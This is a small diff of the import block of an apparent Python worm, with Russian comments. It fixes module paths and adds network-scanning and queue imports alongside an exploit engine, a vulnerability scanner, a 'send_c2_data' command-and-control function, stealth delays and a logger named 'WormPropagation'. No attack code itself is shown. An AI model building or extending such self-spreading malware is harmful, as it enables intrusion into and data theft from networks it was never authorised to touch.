@@ -11,9 +11,11 @@ from typing import List, Dict, Any, Optional, Union, Set
 # Импортируем модули для эксплуатации
 from exploit_engine import ExploitEngine
 from vulnerability_scanner import VulnerabilityScanner
-from exploit_manager import ExploitManager
+from src.exploit_manager import ExploitManager
 from comms.comms import send_c2_data
 from stealth.stealth import random_delay
+from queue import Queue, Empty
+from src.common.utils import scan_network, is_host_reachable
 
 # Настройка логирования
 logger = logging.getLogger('WormPropagation')
